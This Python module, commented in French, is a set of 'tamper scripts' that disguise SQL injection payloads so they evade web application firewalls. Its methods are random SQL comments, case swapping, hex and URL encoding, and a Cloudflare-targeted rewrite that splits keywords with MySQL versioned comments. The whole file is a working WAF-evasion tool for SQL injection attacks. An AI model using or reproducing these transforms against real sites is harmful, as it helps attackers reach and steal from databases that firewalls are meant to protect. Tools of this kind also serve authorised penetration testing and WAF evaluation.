#!/usr/bin/env python3
"""
Tamper Scripts pour contourner les WAF
--------------------------------------
Ce module contient des scripts de modification de payloads pour contourner
différents types de Web Application Firewalls (WAF).
"""

import random
import re
import urllib.parse
from typing import Dict, List, Optional, Union


class TamperScript:
    """Classe de base pour tous les tamper scripts."""
    
    @staticmethod
    def tamper(payload: str) -> str:
        """
        Modifie le payload pour contourner les protections.
        
        Args:
            payload: Le payload SQL original
            
        Returns:
            Le payload modifié
        """
        return payload


class CommentTamper(TamperScript):
    """Ajoute des commentaires SQL aléatoires dans le payload."""
    
    @staticmethod
    def tamper(payload: str) -> str:
        """Ajoute des commentaires SQL aléatoires."""
        if not payload:
            return payload
            
        comments = ['/**/', '/*!*/', '/*1337*/', '/*comment*/', '/*/**/*/', '/**/']
        
        # Insérer des commentaires entre les mots
        words = re.split(r'(\W)', payload)
        for i in range(len(words) - 1):
            if random.random() < 0.3:  # 30% de chance d'ajouter un commentaire
                words[i] += random.choice(comments)
                
        return ''.join(words)


class CaseSwapTamper(TamperScript):
    """Change aléatoirement la casse des mots-clés SQL."""
    
    @staticmethod
    def tamper(payload: str) -> str:
        """Change aléatoirement la casse des mots-clés SQL."""
        if not payload:
            return payload
            
        # Liste des mots-clés SQL courants
        keywords = [
            'SELECT', 'FROM', 'WHERE', 'UNION', 'INSERT', 'UPDATE', 'DELETE',
            'DROP', 'TABLE', 'DATABASE', 'ALTER', 'AND', 'OR', 'ORDER BY',
            'GROUP BY', 'HAVING', 'LIMIT', 'OFFSET', 'JOIN', 'INNER', 'OUTER'
        ]
        
        result = payload
        for keyword in keywords:
            # Chercher le mot-clé indépendamment de la casse
            pattern = re.compile(re.escape(keyword), re.IGNORECASE)
            matches = pattern.finditer(result)
            
            # Remplacer chaque occurrence par une version avec casse aléatoire
            offset = 0
            for match in matches:
                start, end = match.span()
                start += offset
                end += offset
                
                # Générer une version avec casse aléatoire
                swapped = ''.join(c.upper() if random.random() < 0.5 else c.lower() for c in result[start:end])
                
                # Remplacer dans le résultat
                result = result[:start] + swapped + result[end:]
                offset += len(swapped) - (end - start)
                
        return result


class SpaceToCommentTamper(TamperScript):
    """Remplace les espaces par des commentaires SQL."""
    
    @staticmethod
    def tamper(payload: str) -> str:
        """Remplace les espaces par des commentaires SQL."""
        if not payload:
            return payload
            
        comments = ['/**/', '/*!*/', '/*1337*/', '/*comment*/', '/*/**/*/', '/**/']
        
        # Remplacer les espaces par des commentaires
        return re.sub(r'\s+', lambda _: random.choice(comments), payload)


class HexEncodeTamper(TamperScript):
    """Encode les chaînes de caractères en hexadécimal."""
    
    @staticmethod
    def tamper(payload: str) -> str:
        """Encode les chaînes de caractères en hexadécimal."""
        if not payload:
            return payload
            
        # Trouver toutes les chaînes entre guillemets simples
        pattern = r"'([^']*)'"
        
        def hex_encode(match):
            s = match.group(1)
            if not s:
                return "''"
            
            # Encoder en hexadécimal
            hex_str = ''.join(f'{ord(c):02x}' for c in s)
            return f"0x{hex_str}"
            
        return re.sub(pattern, hex_encode, payload)


class URLEncodeTamper(TamperScript):
    """Encode les caractères spéciaux en URL encoding."""
    
    @staticmethod
    def tamper(payload: str) -> str:
        """Encode les caractères spéciaux en URL encoding."""
        if not payload:
            return payload
            
        # Liste des caractères à encoder
        chars_to_encode = ' \'"#&+,/:;=?@\\%'
        
        result = ''
        for char in payload:
            if char in chars_to_encode:
                result += urllib.parse.quote(char)
            else:
                result += char
                
        return result


class CloudflareBypassTamper(TamperScript):
    """Techniques spécifiques pour contourner Cloudflare WAF."""
    
    @staticmethod
    def tamper(payload: str) -> str:
        """Applique des techniques pour contourner Cloudflare WAF."""
        if not payload:
            return payload
            
        # Remplacer les espaces par des tabulations
        payload = payload.replace(' ', '\t')
        
        # Utiliser des commentaires spécifiques
        payload = payload.replace('UNION', 'UN/*!50000ION*/')
        payload = payload.replace('SELECT', 'SE/*!50000LECT*/')
        payload = payload.replace('FROM', 'FR/*!50000OM*/')
        payload = payload.replace('WHERE', 'WH/*!50000ERE*/')
        
        return payload


# Dictionnaire des tamper scripts disponibles
TAMPER_SCRIPTS = {
    'comment': CommentTamper,
    'case_swap': CaseSwapTamper,
    'space_to_comment': SpaceToCommentTamper,
    'hex_encode': HexEncodeTamper,
    'url_encode': URLEncodeTamper,
    'cloudflare': CloudflareBypassTamper
}


def apply_tamper_scripts(payload: str, scripts: List[str]) -> str:
    """
    Applique une liste de tamper scripts à un payload.
    
    Args:
        payload: Le payload SQL original
        scripts: Liste des noms de tamper scripts à appliquer
        
    Returns:
        Le payload modifié après application de tous les scripts
    """
    result = payload
    
    for script_name in scripts:
        if script_name in TAMPER_SCRIPTS:
            script = TAMPER_SCRIPTS[script_name]
            result = script.tamper(result)
            
    return result


def get_available_tamper_scripts() -> List[str]:
    """
    Retourne la liste des tamper scripts disponibles.
    
    Returns:
        Liste des noms de tamper scripts disponibles
    """
    return list(TAMPER_SCRIPTS.keys())


def get_tamper_script_description(script_name: str) -> str:
    """
    Retourne la description d'un tamper script.
    
    Args:
        script_name: Nom du tamper script
        
    Returns:
        Description du tamper script ou message d'erreur
    """
    if script_name in TAMPER_SCRIPTS:
        return TAMPER_SCRIPTS[script_name].__doc__
    return f"Tamper script '{script_name}' non trouvé."
